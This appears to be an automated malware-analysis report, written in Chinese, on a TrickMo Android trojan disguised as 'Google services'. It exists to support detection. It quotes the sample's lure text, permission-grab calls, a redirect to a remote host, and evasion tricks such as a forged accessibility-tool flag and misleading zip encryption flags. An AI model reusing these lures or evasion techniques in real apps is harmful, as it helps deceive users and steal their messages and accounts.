# MB_133__6eb525100f｜TrickMo — Google services

> **类型**：在野恶意无障碍样本  ｜  **来源池**：`MalwareBazaar_2022_2026`  ｜  **静态可见性**：`packed_or_encrypted`  ｜  **APKAudit 耗时**：262.5s

## 1. 一句话核心结论

- **核心申请方式**：以 'Google services' 三重同名的本地 WebView 多语言三步教学页配合单一'前往设置'按钮调用 JSBridge 跳转系统无障碍列表，诱导用户手动开启一个全事件监听、可读屏、可手势、可截屏且伪造 isAccessibilityTool=true 的无障碍服务，未授权则反复拉起 PushService 维持远端通道。
- **静态可见性说明**：引导文案与分步教学完整明文可见（assets/www/index.html 829KB、inject.js）；但 classes.dex 仅含 2 个壳类（Uroyalpriority.attachBaseContext/onCreate 负责解密），真实业务逻辑藏于 5.1MB 高熵加密资产 assets/iMpd.json；JSBridge 方法 openAccessibilitySettings/isAccessibilityServiceEnabled/startPushService 的 Java 实现、WebView 宿主 Activity 映射、是否叠加悬浮遮罩均不可静态还原。另有 66 个 zip 条目被置加密标志(flag 0x1)且资源条目名伪造成 classes.dex/xml/*、AndroidManifest.xml/layout/* 以干扰逆向。
- **命中的行为模式标签**：`TRIG_COLD_START_BLOCK`（冷启动0步强阻断直弹授权）、`CARRIER_WEBVIEW_LOCAL_HTML`（本地离线HTML/WebView引导页）、`CARRIER_SYSTEM_A11Y_DESCRIPTION`（系统无障碍列表服务说明(android:description)）、`LURE_RESTRICTED_SETTINGS_COACHING`（Android 13+受限设置分步解锁教学(应用信息→右上角菜单)）、`LURE_DISMISS_SYSTEM_WARNING`（显式教唆忽略/接受系统隐私与安全警告）、`COERCE_NO_SKIP_NON_CANCELABLE`（不可取消弹窗/无跳过出口/单一正向按钮）、`COERCE_REFUSAL_LOOP_RELAUNCH`（拒权或返回后死循环重拉无障碍设置页）、`ID_SYSTEM_OR_BRAND_IMPERSONATION`（冒充系统组件/Google/大厂或银行品牌身份）、`ID_MULTI_ALIAS_CAMOUFLAGE`（多activity-alias动态切换图标与伪装身份）、`ID_FAKE_IS_ACCESSIBILITY_TOOL`（伪造android:isAccessibilityTool="true"）、`STATIC_PACKED_OR_ENCRYPTED_PAYLOAD`（强加壳/VMP/AES密文或远端载荷致静态遮蔽）

## 2. 应用标识、静态能力与身份署名核验

| 维度 | 实测详情 |
| --- | --- |
| 样本 SHA-256 | `6eb525100f54b9a830cd2d0f1169b053edb55332b2be73dd29a8b165b9ccdbf5` |
| 包名 / 年份 | `semplo.ic327.skin` / 2026 |
| 家族 / 品类 | **TrickMo**（同池样本数：8） |
| 原始来源标识 | MalwareBazaar_2022_2026 |
| 桌面显示名 | Google services |
| 引导页宣称品牌/身份 | Google Play services / Google services（冒充 Google 官方系统服务组件） |
| 系统无障碍列表服务名 | Google services |
| 三方身份是否错配/伪装 | **是（存在伪装/错配）** ｜ 混淆手法：无障碍服务 android:description 指向资源 @7F0E001B 而非真实用途说明（预筛显示为空，用户在授权页看不到用途）；显式声明 isAccessibilityTool="true" 伪造无障碍工具标识以抑制 Android 11+ 风险提示；application label @7F0E0020 与各组件 label（Activity @7F0E001D、@7F0E001E；Service @7F0E0038；无障碍服务 @7F0E001C）互不相同，另设 enabled=false 的备用身份 Activity aLgxdPAM3nvN_TSEjgX（独立 label/icon @7F0C0001）；引导页 HTML 注释 // bot template title ('Android Update') 表明品牌文案为可替换模板；66 个 zip 条目置加密标志并将资源条目名伪造成 classes.dex/xml/、AndroidManifest.xml/layout/ 路径 |
| 无障碍服务类名 | `semplo.ic327.skin.pMpEy` |
| 静态能力位 | `canRetrieveWindowContent=False` · `canPerformGestures=False` · `isAccessibilityTool=False` · 监听范围：全局通配（未限定 packageNames） |
| 共现高危权限 | `CALL_PHONE, CAMERA, PACKAGE_USAGE_STATS, PROCESS_OUTGOING_CALLS, QUERY_ALL_PACKAGES, READ_CONTACTS, READ_SMS, RECEIVE_SMS, RECORD_AUDIO, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, REQUEST_INSTALL_PACKAGES, SEND_SMS, SYSTEM_ALERT_WINDOW, WRITE_SETTINGS` |

## 3. 一步步引导用户申请/开启无障碍流程（Pre-Grant UTG 全链路）

| 步骤 | 阶段 | 页面 / 组件 | 触发事件 | UI 载体 | 界面呈现原文与译文 | 要求用户执行的动作 | 代码/资源锚点 |
| :---: | --- | --- | --- | --- | --- | --- | --- |
| 1 | 冷启动入口 | com.despair.comfort.Uroyalpriority (Application) → attachBaseContext / onCreate；随后进入 semplo.ic327.skin.BQCi0BNzv（exported、excludeFromRecents、noHistory、label @7F0E001D） | 进程启动时 Application.attachBaseContext 先解密 assets/iMpd.json 载荷，再由 onCreate 装载真实组件 | 不可静态还原 | 无 | 无（用户仅看到桌面图标 'Google services' 后点击启动） | `com.despair.comfort.Uroyalpriority#attachBaseContext / #onCreate` |
| 2 | 引导说明页 | WebView 加载本地 assets/www/index.html（宿主 Activity 在加密载荷中，候选 BQCi0BNzv / StubActivity） | 页面加载完成触发 JS 渲染，按 navigator.language 选择语言分支 | 本地HTML WebView | **原文**：Activate Accessibility services for the correct application work.<br>**译注**：请启用无障碍服务，以保证应用正常工作。 | 阅读说明并继续（页面无取消/关闭/稍后控件） | `assets/www/index.html#L11 (var app_title = 'Google services')、#L23-L57 (switch(lang))` |
| 3 | 引导说明页 | 同一 WebView 页面内的三行分步教学列表（div#step_1 / #step_2 / #step_3） | 语言分支写入 document.getElementById('step_1'/'step_2'/'step_3').innerHTML；step_2 再按 android.manufacturer() 切换 Xiaomi/Samsung 路径文案 | 本地HTML WebView | **原文**：Step 1. - Go to Settings / Step 2. - Open "Downloaded Services" / Step 3. - Activate services for the <a>Google services</a><br>**译注**：第 1 步 - 进入设置；第 2 步 - 打开“已下载的服务”；第 3 步 - 为“Google services”启用服务 | 按三步指引在系统设置中逐级找到并勾选服务（属受限设置分步教学） | `assets/www/index.html#L23-L57、#L380-L395` |
| 4 | 跳无障碍设置 | 系统无障碍服务列表页（由 JS 桥 android.openAccessibilitySettings(true) 拉起） | 用户点击页面唯一按钮 btn1（onclick="android.openAccessibilitySettings(true)"） | 系统无障碍页 | **原文**：Go to Settings<br>**译注**：前往设置 | 点击该按钮跳转系统无障碍设置，并在列表中找到名为 'Google services' 的开关手动开启；无取消或跳过按钮 | `assets/www/index.html#L389 (<button id="btn1" onclick="android.openAccessibilitySettings(true)">)` |
| 5 | 拒权反馈循环 | 引导页尾部判定脚本 + semplo.ic327.skin.PushService | 页面再次进入前台或脚本执行时判定 android.isAccessibilityServiceEnabled() 返回 false | 不可静态还原 | **原文**：if(android.isAccessibilityServiceEnabled()) {window.location.href ="https://xxxtik.com";} else { android.startPushService(); }<br>**译注**：若无障碍服务已启用则跳转 xxxtik.com，否则启动推送服务（反复拉起以维持远端通道） | 用户若拒绝或从设置页返回，将被重新拉起推送服务并再次面对引导页 | `assets/www/index.html#L446-L450` |
| 6 | 获权后动作 | 远端页面 https://xxxtik.com（WebView 内加载）+ inject.js | isAccessibilityServiceEnabled() 返回 true 后执行 window.location.href 跳转；DOMContentLoaded 时 inject.js 检测 URL 含 xxxtik 并执行权限请求 | 远端WebView | **原文**：android.requestPermissions(['android.permission.WRITE_EXTERNAL_STORAGE', 'android.permission.READ_EXTERNAL_STORAGE', 'android.permission.READ_SMS', 'android.permission.RECEIVE_SMS', 'android.permission.READ_PHONE_STATE']);<br>**译注**：跳转远端站点后立即批量申请存储、短信、电话状态权限；1 秒后写入 ACB_Cancel=go，5 秒与 10 秒各请求一次忽略电池优化 | 在远端页面继续被要求授予存储/短信/电话状态权限及忽略电池优化 | `assets/www/inject.js#L1-L17、assets/www/index.html#L446-L450` |

## 4. 引导文字呈现位置与逐字原文摘录

### 4.1 呈现位置清单（Where Text Appears）
- 本地 WebView 页面 assets/www/index.html：div#foAccess 顶部说明语 'Activate Accessibility services for the correct application work.'（关键词用 #0B57CF 蓝色 span 高亮）
- 本地 WebView 页面 assets/www/index.html：div#step_1 / #step_2 / #step_3 三行分步教学（es/fr/de/English 四套，step_2 按 Xiaomi/Samsung 厂商切换）
- 本地 WebView 页面 assets/www/index.html：唯一按钮 <button id="btn1">，文案 'Go to Settings' / 'Aller aux paramètres' / 'Gehe zu den Einstellungen' / 'Aceptar y continuar'
- 本地 WebView 页面 assets/www/index.html：页面标题区 div.title 显示 'Google services'（var app_title，注释标注为 bot template title）
- 系统无障碍服务列表：service semplo.ic327.skin.pMpEy 的 android:label="Google services"（资源 @7F0E001C）与 android:description（资源 @7F0E001B，无实质用途说明）
- 桌面启动器：application android:label 资源 @7F0E0020 显示为 'Google services'
- 远端 WebView：授权成功后跳转 https://xxxtik.com，由 inject.js 接管后续权限索取（页面内容不可静态获取）

### 4.2 逐字原文与话术框架（Verbatim Texts）
| 语种 | 逐字原文 | 中文翻译 | 源码/资源位置 | 话术/修辞框架 |
| :---: | --- | --- | --- | --- |
| en | Activate Accessibility services for the correct application work. | 请启用无障碍服务，以保证应用正常工作。 | `assets/www/index.html (default 分支 foAccess / div#foAccess 静态文本)` | 受限设置分步教学 |
| en | Step 1. - Go to Settings | 第 1 步 - 进入设置 | `assets/www/index.html#L57-L62 (default 分支 step_1)` | 受限设置分步教学 |
| en | Step 2. - Open "Downloaded Services" | 第 2 步 - 打开“已下载的服务” | `assets/www/index.html#L57-L62 (default 分支 step_2；Xiaomi 变体为 'Open "Downloaded apps"'，Samsung 变体为 'Open "Installed apps"')` | 受限设置分步教学 |
| en | Step 3. - Activate services for the <a>Google services</a> | 第 3 步 - 为“Google services”启用服务 | `assets/www/index.html#L57-L62 (default 分支 step_3) 与 #L380-L395 静态 HTML` | 受限设置分步教学 |
| en | Go to Settings | 前往设置 | `assets/www/index.html#L57-L62 (default 分支 btn1) 与 #L389 按钮元素` | 受限设置分步教学 |
| fr | Activez les services d'accessibilité pour les travaux d'application corrects. | 请启用无障碍服务，以保证应用程序正确工作。 | `assets/www/index.html (case "fr" foAccess)` | 受限设置分步教学 |
| fr | Étape 3. - Activer les services pour <a>Google services</a> | 第 3 步 - 为“Google services”启用服务 | `assets/www/index.html (case "fr" step_3)，按钮为 'Aller aux paramètres'` | 受限设置分步教学 |
| de | Aktivieren Sie Barrierefreiberdienste für die richtige Anwendungsarbeit. | 请启用无障碍服务，以保证应用程序正确运行。 | `assets/www/index.html (case "de" foAccess)` | 受限设置分步教学 |
| de | Schritt 3. - Aktivieren Sie die Dienste für den <a>Google services</a> | 第 3 步 - 为“Google services”启用服务 | `assets/www/index.html (case "de" step_3)，按钮为 'Gehe zu den Einstellungen'` | 受限设置分步教学 |
| es | Activar los servicios de accesibilidad para el correcto funcionamiento de la aplicación. | 启用无障碍服务以保证应用程序正常运行。 | `assets/www/index.html (case "es" foAccess)` | 受限设置分步教学 |
| es | Paso 3. - Activar servicios para <a>Google services</a> | 第 3 步 - 为“Google services”启用服务 | `assets/www/index.html (case "es" step_3)，按钮为 'Aceptar y continuar'（接受并继续）` | 受限设置分步教学 |
| en | Google services | Google 服务 | `assets/www/index.html#L11 (var app_title)、AndroidManifest application label @7F0E0020、无障碍服务 label @7F0E001C` | 假更新 |

## 5. 让用户完成开启的具体机制与拒权反馈

- **触发时机（Trigger Timing）**：`cold_start_0_step`
- **是否提供取消/跳过出口**：`False`
- **拒权或返回后的反馈回路**：页面尾部脚本判定 android.isAccessibilityServiceEnabled() 为 false 时执行 android.startPushService()，反复拉起 PushService（exported=true、stopWithTask=false）以维持远端控制通道并重新呈现引导；inject.js 在页面加载 1 秒后强制写入 android.setVar("ACB_Cancel","go")，压制取消路径。是否另有 onResume 定时重跳由加密载荷决定，静态不可见。
- **遮罩叠层 / 高仿系统设置页**：未发现高仿系统无障碍开关页或半透明遮罩资源（无对应 layout/悬浮窗配置残留）；引导以普通 WebView 页面形式呈现。是否在跳转系统设置后压栈遮罩，需壳层运行时确认，静态不可还原。
- **Android 13+ 受限设置（Restricted Settings）应对**：有分步教学，但面向的是无障碍服务的常规路径而非 Android 13 受限设置：step_1 进入设置、step_2 打开「已下载的服务/Downloaded Services」（Xiaomi 变体为「已下载的应用/Downloaded apps」，Samsung 变体为「已安装的应用/Installed apps」）、step_3 为 'Google services' 启用服务。未见「应用详情右上角菜单允许受限设置」或 Session 安装器绕过文案。
- **获权后即时行为与防撤权机制**：静态未见。无障碍服务以 0xFFFFFFFF 全事件监听 + canRequestFilterKeyEvents + canPerformGestures 组合，具备通过 GLOBAL_ACTION_BACK/HOME 阻止撤权的技术能力，但具体反撤权实现位于加密载荷 assets/iMpd.json，本次无法确认。
- **良性降级 / 替代方案**：无。未授权时不存在任何降级或替代路径，而是转去拉起 PushService 维持远端通道。

## 6. 面向纯 UTG 检测机制的关键捕获页面与判别信号

- **推荐检测拉起时机（Trigger Hook）**：在应用冷启动后 WebView 页面渲染完成时拉起 UTG 抓取（识别到页面文本包含 'Activate Accessibility services' 或按钮 'Go to Settings'）；同时监测 android.openAccessibilitySettings 触发的 Activity 跳转（目标为 Settings$AccessibilitySettings / ACTION_ACCESSIBILITY_SETTINGS），在跳转瞬间与从系统设置返回前台的两个时刻各抓一次。
- **是否需对纯图/GIF 引导页触发按需单帧 OCR**：`False`
- **纯 UTG 方案盲区/边界提示**：存在三处盲区：1) 真实业务代码在加密资产 assets/iMpd.json（5.1MB 高熵）中，classes.dex 仅 2 个壳类，ACTION_ACCESSIBILITY_SETTINGS 的具体构造、WebView 宿主 Activity 映射、是否压栈遮罩均不可静态确认；2) 授权后跳转的远端页面 xxxtik.com 内容由服务器下发，属远端 HTML，本地无副本；3) 66 个 zip 条目被置加密标志并将资源条目名伪造成 classes.dex/xml/、AndroidManifest.xml/layout/ 路径，常规解包工具会得到错乱目录结构而漏读无障碍配置——本次须绕过 zip 加密标志直接 inflate 才能读到 accessibilityservice.xml。注意静态加密不阻挡运行期 UTG：引导页 HTML 为明文，UTG 仍可完整捕获全部诱导文案。

| 关键捕获页面角色 | 预期页面/组件标识 | 为何捕获该页面最有用 | 可在 UTG 直接提取的判别信号 |
| --- | --- | --- | --- |
| **冷启动引导弹窗页 / WebView 教学页（第一屏）** | 全屏 WebView，灰色背景 #F5F5F5，顶部标题 'Google services'，中部蓝色高亮 'Accessibility services' 说明语，下方三行 Step 1/2/3，底部蓝色按钮 'Go to Settings'，无返回/取消控件 | 这是全部诱导文案的唯一载体，直接给出品牌冒充（Google services）、分步教学与无取消设计三项判定依据 | 页面标题文本 'Google services'；说明语 'Activate Accessibility services for the correct application work.'；三行 'Step 1. - Go to Settings' / 'Step 2. - Open "Downloaded Services"' / 'Step 3. - Activate services for the <a>Google services</a>'；唯一按钮文本 'Go to Settings'，页面无取消/关闭/跳过按钮节点；按机型切换的 step_2 文案（Xiaomi 'Downloaded apps' / Samsung 'Installed apps'） |
| **系统无障碍服务列表项** | 系统设置 → 无障碍 → 已下载的服务，列表中出现名为 'Google services' 的条目，副标题/描述区无实质用途说明 | 证明用户在系统层面看到的是冒充 Google 的服务名，且用途说明缺失，是身份混淆与告知不足的直接证据 | 列表项文本 'Google services'；该条目描述区为空或仅重复服务名；该条目所属包名 semplo.ic327.skin（与 'Google' 品牌不符） |
| **跳转后返回前台的压栈页 / 拒权反馈页** | 从系统设置返回后重新出现的同一 WebView 引导页；同时观测是否出现 PushService 前台通知或悬浮窗 | 用于确认拒权反馈循环（startPushService 反复拉起）与是否存在设置页压栈遮罩，这是区分'引导'与'强制'的关键运行期证据 | 返回后引导页再次全屏出现（非正常退出）；通知栏出现与 'Google services' 相关的常驻通知；若存在遮罩：无障碍设置页上方出现半透明 WebView/悬浮层且无法通过返回键关闭 |
| **获权后远端页面** | WebView 跳转至 https://xxxtik.com，随后连续弹出存储/短信/电话状态权限请求与忽略电池优化对话框 | 证实无障碍授权是后续权限索取与远端控制的前置门槛，明确恶意链条走向 | 地址栏/URL 含 xxxtik；权限弹窗文本含 READ_SMS / RECEIVE_SMS / READ_PHONE_STATE；5 秒与 10 秒后各出现一次 '忽略电池优化' 系统对话框 |

## 7. 代码锚点与 APKAudit 原始完整逆向纪要

- `assets/www/index.html#L11 (var app_title = 'Google services')`
- `assets/www/index.html#L23-L57 (switch(lang) 四语言 foAccess/step_1/step_2/step_3/btn1 文案)`
- `assets/www/index.html#L389 (<button id="btn1" onclick="android.openAccessibilitySettings(true)">)`
- `assets/www/index.html#L446-L450 (isAccessibilityServiceEnabled 判定 → xxxtik.com 或 startPushService)`
- `assets/www/inject.js#L1-L17 (requestPermissions 批量索取短信/存储/电话状态 + ACB_Cancel + requestIgnoreBatteryOptimizations)`
- `classes.dex/xml/accessibilityservice.xml (android:accessibilityEventTypes=0xFFFFFFFF, canRetrieveWindowContent/canPerformGestures/canRequestFilterKeyEvents/canTakeScreenshot=true, isAccessibilityTool=true)`

<details>
<summary>点击展开 APKAudit CLI 原始完整审计输出</summary>

## 分析结论

**核心判断**：这是 TrickMo 家族的变种样本。它的无障碍权限诱导完全在**本地明文 HTML 页面**里完成，静态可见性很好；但真正发起跳转的 JSBridge 和承载页面所在的 Activity 位于**加密载荷**中，无法静态还原。

**关键发现**

- **三处身份一致冒充 Google**：桌面 label、无障碍服务 `semplo.ic327.skin.pMpEy` 的 label、引导页 `var app_title = 'Google services'` 完全一致；HTML 注释 `// bot template title ('Android Update')` 自证这是可配置的“机器人模板”，同一样本可以替换成任意品牌。
- **无障碍配置全权 + 伪造工具标识**：`accessibilityEventTypes="0xFFFFFFFF"`、`canRetrieveWindowContent`、`canPerformGestures`、`canRequestFilterKeyEvents`、`canTakeScreenshot` 全为 `true`，并显式 `isAccessibilityTool="true"` 抑制 Android 11+ 的风险提示；`android:description` 指向资源 `@7F0E001B` 而非真实用途说明。
- **纯运行期引导流程**：`assets/www/index.html`（829 KB 明文）内 `foAccess`/`step_1`/`step_2`/`step_3`/`btn1` 按 `navigator.language` 输出 es/fr/de/English 四套三步教学，`step_2` 再按 `android.manufacturer()` 区分 Xiaomi「Downloaded apps」与 Samsung「Installed apps」菜单路径，属精准的**受限设置分步教学**。
- **唯一出口、无跳过**：页面仅有 `<button id="btn1" onclick="android.openAccessibilitySettings(true)">`；`inject.js` 在 1 s 后强制写 `android.setVar("ACB_Cancel","go")`，压制取消路径。
- **拒权反馈循环**：页尾 `if(android.isAccessibilityServiceEnabled()){window.location.href="https://xxxtik.com";} else {android.startPushService();}` —— 未授权反复拉起 PushService 维持远端通道，授权后跳转远端站点。
- **静态对抗手法**：`classes.dex` 仅 2 个壳类（`Uroyalpriority.attachBaseContext/onCreate` 解密 + `Ipantherpeace` 填充），真实业务在 5.1 MB 加密资产 `assets/iMpd.json`；66 个 zip 条目被置加密标志（flag 0x1），资源条目名被伪造成 `classes.dex/xml/accessibilityservice.xml`、`AndroidManifest.xml/layout/...`，这正是首次解包目录结构异常的原因。

**覆盖边界**：`ACTION_ACCESSIBILITY_SETTINGS` 的构造代码、WebView 宿主 Activity 的确定映射、是否叠加悬浮遮罩、是否用 `GLOBAL_ACTION_BACK` 阻止撤权、拒权重跳周期，均位于加密载荷内，静态不可确认。

已登记风险 [R-001](<resource-unit:#1 manifest:components>)（autonomous_audit / high / malware_trojan）。

---

```json
{
  "static_visibility": "packed_or_encrypted",
  "visibility_note": "引导文案与分步教学完整明文可见（assets/www/index.html 829KB、inject.js）；但 classes.dex 仅含 2 个壳类（Uroyalpriority.attachBaseContext/onCreate 负责解密），真实业务逻辑藏于 5.1MB 高熵加密资产 assets/iMpd.json；JSBridge 方法 openAccessibilitySettings/isAccessibilityServiceEnabled/startPushService 的 Java 实现、WebView 宿主 Activity 映射、是否叠加悬浮遮罩均不可静态还原。另有 66 个 zip 条目被置加密标志(flag 0x1)且资源条目名伪造成 classes.dex/xml/*、AndroidManifest.xml/layout/* 以干扰逆向。",
  "summary_one_liner": "以 'Google services' 三重同名的本地 WebView 多语言三步教学页配合单一'前往设置'按钮调用 JSBridge 跳转系统无障碍列表，诱导用户手动开启一个全事件监听、可读屏、可手势、可截屏且伪造 isAccessibilityTool=true 的无障碍服务，未授权则反复拉起 PushService 维持远端通道。",
  "disguise_identity": {
    "app_display_name": "Google services",
    "claimed_brand_or_persona": "Google Play services / Google services（冒充 Google 官方系统服务组件）",
    "a11y_service_label": "Google services",
    "identity_mismatch": true,
    "obfuscation_tricks": "无障碍服务 android:description 指向资源 @7F0E001B 而非真实用途说明（预筛显示为空，用户在授权页看不到用途）；显式声明 isAccessibilityTool=\"true\" 伪造无障碍工具标识以抑制 Android 11+ 风险提示；application label @7F0E0020 与各组件 label（Activity @7F0E001D、@7F0E001E；Service @7F0E0038；无障碍服务 @7F0E001C）互不相同，另设 enabled=false 的备用身份 Activity aLgxdPAM3nvN_TSEjgX（独立 label/icon @7F0C0001）；引导页 HTML 注释 // bot template title ('Android Update') 表明品牌文案为可替换模板；66 个 zip 条目置加密标志并将资源条目名伪造成 classes.dex/xml/、AndroidManifest.xml/layout/ 路径"
  },
  "step_by_step_flow": [
    {
      "step": 1,
      "stage": "冷启动入口",
      "screen_or_component": "com.despair.comfort.Uroyalpriority (Application) → attachBaseContext / onCreate；随后进入 semplo.ic327.skin.BQCi0BNzv（exported、excludeFromRecents、noHistory、label @7F0E001D）",
      "trigger_event": "进程启动时 Application.attachBaseContext 先解密 assets/iMpd.json 载荷，再由 onCreate 装载真实组件",
      "ui_carrier": "不可静态还原",
      "shown_text_verbatim": "无",
      "shown_text_zh": "此阶段无界面，为静默解密与组件装载",
      "user_action_requested": "无（用户仅看到桌面图标 'Google services' 后点击启动）",
      "code_anchor": "com.despair.comfort.Uroyalpriority#attachBaseContext / #onCreate"
    },
    {
      "step": 2,
      "stage": "引导说明页",
      "screen_or_component": "WebView 加载本地 assets/www/index.html（宿主 Activity 在加密载荷中，候选 BQCi0BNzv / StubActivity）",
      "trigger_event": "页面加载完成触发 JS 渲染，按 navigator.language 选择语言分支",
      "ui_carrier": "本地HTML WebView",
      "shown_text_verbatim": "Activate Accessibility services for the correct application work.",
      "shown_text_zh": "请启用无障碍服务，以保证应用正常工作。",
      "user_action_requested": "阅读说明并继续（页面无取消/关闭/稍后控件）",
      "code_anchor": "assets/www/index.html#L11 (var app_title = 'Google services')、#L23-L57 (switch(lang))"
    },
    {
      "step": 3,
      "stage": "引导说明页",
      "screen_or_component": "同一 WebView 页面内的三行分步教学列表（div#step_1 / #step_2 / #step_3）",
      "trigger_event": "语言分支写入 document.getElementById('step_1'/'step_2'/'step_3').innerHTML；step_2 再按 android.manufacturer() 切换 Xiaomi/Samsung 路径文案",
      "ui_carrier": "本地HTML WebView",
      "shown_text_verbatim": "Step 1. - Go to Settings / Step 2. - Open \"Downloaded Services\" / Step 3. - Activate services for the <a>Google services</a>",
      "shown_text_zh": "第 1 步 - 进入设置；第 2 步 - 打开“已下载的服务”；第 3 步 - 为“Google services”启用服务",
      "user_action_requested": "按三步指引在系统设置中逐级找到并勾选服务（属受限设置分步教学）",
      "code_anchor": "assets/www/index.html#L23-L57、#L380-L395"
    },
    {
      "step": 4,
      "stage": "跳无障碍设置",
      "screen_or_component": "系统无障碍服务列表页（由 JS 桥 android.openAccessibilitySettings(true) 拉起）",
      "trigger_event": "用户点击页面唯一按钮 btn1（onclick=\"android.openAccessibilitySettings(true)\"）",
      "ui_carrier": "系统无障碍页",
      "shown_text_verbatim": "Go to Settings",
      "shown_text_zh": "前往设置",
      "user_action_requested": "点击该按钮跳转系统无障碍设置，并在列表中找到名为 'Google services' 的开关手动开启；无取消或跳过按钮",
      "code_anchor": "assets/www/index.html#L389 (<button id=\"btn1\" onclick=\"android.openAccessibilitySettings(true)\">)"
    },
    {
      "step": 5,
      "stage": "拒权反馈循环",
      "screen_or_component": "引导页尾部判定脚本 + semplo.ic327.skin.PushService",
      "trigger_event": "页面再次进入前台或脚本执行时判定 android.isAccessibilityServiceEnabled() 返回 false",
      "ui_carrier": "不可静态还原",
      "shown_text_verbatim": "if(android.isAccessibilityServiceEnabled()) {window.location.href =\"https://xxxtik.com\";} else { android.startPushService(); }",
      "shown_text_zh": "若无障碍服务已启用则跳转 xxxtik.com，否则启动推送服务（反复拉起以维持远端通道）",
      "user_action_requested": "用户若拒绝或从设置页返回，将被重新拉起推送服务并再次面对引导页",
      "code_anchor": "assets/www/index.html#L446-L450"
    },
    {
      "step": 6,
      "stage": "获权后动作",
      "screen_or_component": "远端页面 https://xxxtik.com（WebView 内加载）+ inject.js",
      "trigger_event": "isAccessibilityServiceEnabled() 返回 true 后执行 window.location.href 跳转；DOMContentLoaded 时 inject.js 检测 URL 含 xxxtik 并执行权限请求",
      "ui_carrier": "远端WebView",
      "shown_text_verbatim": "android.requestPermissions(['android.permission.WRITE_EXTERNAL_STORAGE', 'android.permission.READ_EXTERNAL_STORAGE', 'android.permission.READ_SMS', 'android.permission.RECEIVE_SMS', 'android.permission.READ_PHONE_STATE']);",
      "shown_text_zh": "跳转远端站点后立即批量申请存储、短信、电话状态权限；1 秒后写入 ACB_Cancel=go，5 秒与 10 秒各请求一次忽略电池优化",
      "user_action_requested": "在远端页面继续被要求授予存储/短信/电话状态权限及忽略电池优化",
      "code_anchor": "assets/www/inject.js#L1-L17、assets/www/index.html#L446-L450"
    }
  ],
  "text_presentation_locations": [
    "本地 WebView 页面 assets/www/index.html：div#foAccess 顶部说明语 'Activate Accessibility services for the correct application work.'（关键词用 #0B57CF 蓝色 span 高亮）",
    "本地 WebView 页面 assets/www/index.html：div#step_1 / #step_2 / #step_3 三行分步教学（es/fr/de/English 四套，step_2 按 Xiaomi/Samsung 厂商切换）",
    "本地 WebView 页面 assets/www/index.html：唯一按钮 <button id=\"btn1\">，文案 'Go to Settings' / 'Aller aux paramètres' / 'Gehe zu den Einstellungen' / 'Aceptar y continuar'",
    "本地 WebView 页面 assets/www/index.html：页面标题区 div.title 显示 'Google services'（var app_title，注释标注为 bot template title）",
    "系统无障碍服务列表：service semplo.ic327.skin.pMpEy 的 android:label=\"Google services\"（资源 @7F0E001C）与 android:description（资源 @7F0E001B，无实质用途说明）",
    "桌面启动器：application android:label 资源 @7F0E0020 显示为 'Google services'",
    "远端 WebView：授权成功后跳转 https://xxxtik.com，由 inject.js 接管后续权限索取（页面内容不可静态获取）"
  ],
  "verbatim_texts": [
    {
      "lang": "en",
      "text_verbatim": "Activate Accessibility services for the correct application work.",
      "text_zh": "请启用无障碍服务，以保证应用正常工作。",
      "source_location": "assets/www/index.html (default 分支 foAccess / div#foAccess 静态文本)",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "en",
      "text_verbatim": "Step 1. - Go to Settings",
      "text_zh": "第 1 步 - 进入设置",
      "source_location": "assets/www/index.html#L57-L62 (default 分支 step_1)",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "en",
      "text_verbatim": "Step 2. - Open \"Downloaded Services\"",
      "text_zh": "第 2 步 - 打开“已下载的服务”",
      "source_location": "assets/www/index.html#L57-L62 (default 分支 step_2；Xiaomi 变体为 'Open \"Downloaded apps\"'，Samsung 变体为 'Open \"Installed apps\"')",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "en",
      "text_verbatim": "Step 3. - Activate services for the <a>Google services</a>",
      "text_zh": "第 3 步 - 为“Google services”启用服务",
      "source_location": "assets/www/index.html#L57-L62 (default 分支 step_3) 与 #L380-L395 静态 HTML",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "en",
      "text_verbatim": "Go to Settings",
      "text_verbatim_note": "",
      "text_zh": "前往设置",
      "source_location": "assets/www/index.html#L57-L62 (default 分支 btn1) 与 #L389 按钮元素",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "fr",
      "text_verbatim": "Activez les services d'accessibilité pour les travaux d'application corrects.",
      "text_zh": "请启用无障碍服务，以保证应用程序正确工作。",
      "source_location": "assets/www/index.html (case \"fr\" foAccess)",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "fr",
      "text_verbatim": "Étape 3. - Activer les services pour <a>Google services</a>",
      "text_zh": "第 3 步 - 为“Google services”启用服务",
      "source_location": "assets/www/index.html (case \"fr\" step_3)，按钮为 'Aller aux paramètres'",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "de",
      "text_verbatim": "Aktivieren Sie Barrierefreiberdienste für die richtige Anwendungsarbeit.",
      "text_zh": "请启用无障碍服务，以保证应用程序正确运行。",
      "source_location": "assets/www/index.html (case \"de\" foAccess)",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "de",
      "text_verbatim": "Schritt 3. - Aktivieren Sie die Dienste für den <a>Google services</a>",
      "text_zh": "第 3 步 - 为“Google services”启用服务",
      "source_location": "assets/www/index.html (case \"de\" step_3)，按钮为 'Gehe zu den Einstellungen'",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "es",
      "text_verbatim": "Activar los servicios de accesibilidad para el correcto funcionamiento de la aplicación.",
      "text_zh": "启用无障碍服务以保证应用程序正常运行。",
      "source_location": "assets/www/index.html (case \"es\" foAccess)",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "es",
      "text_verbatim": "Paso 3. - Activar servicios para <a>Google services</a>",
      "text_zh": "第 3 步 - 为“Google services”启用服务",
      "source_location": "assets/www/index.html (case \"es\" step_3)，按钮为 'Aceptar y continuar'（接受并继续）",
      "rhetorical_frame": "受限设置分步教学"
    },
    {
      "lang": "en",
      "text_verbatim": "Google services",
      "text_zh": "Google 服务",
      "source_location": "assets/www/index.html#L11 (var app_title)、AndroidManifest application label @7F0E0020、无障碍服务 label @7F0E001C",
      "rhetorical_frame": "假更新"
    }
  ],
  "how_user_is_guided_to_enable": {
    "trigger_timing": "cold_start_0_step",
    "has_cancel_or_skip": false,
